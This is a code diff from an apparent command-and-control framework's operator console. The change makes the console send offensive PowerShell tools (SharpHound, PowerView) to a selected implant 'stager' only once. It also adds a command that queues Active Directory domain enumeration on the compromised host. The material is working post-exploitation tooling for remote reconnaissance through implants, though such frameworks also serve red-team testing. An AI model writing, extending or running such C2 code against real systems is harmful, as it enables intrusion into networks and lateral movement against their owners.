@@ -1294,9 +1294,12 @@ class mymainclass():
                         print("Please input a valid stager uuid")
                         continue
                     
-                    t_psloader = ps_loader()
-                    t_result = t_psloader.load_ps("Invoke-Sharphound3.ps1")
-                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                    if ("Invoke-Sharphound3.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-Sharphound3.ps1")
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Sharphound3.ps1")
 
                     
                     removecomplete()
@@ -1319,7 +1322,25 @@ class mymainclass():
                     for each_msg in self.__t_myserver.get_history()[user_input_stager]:
                         print(each_msg)
                     continue
+                
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETDOMAIN:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
 
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    
+                    if ("PowerView.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("PowerView.ps1")
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"PowerView.ps1")
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETDOMAIN)
+                    continue
 
 
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
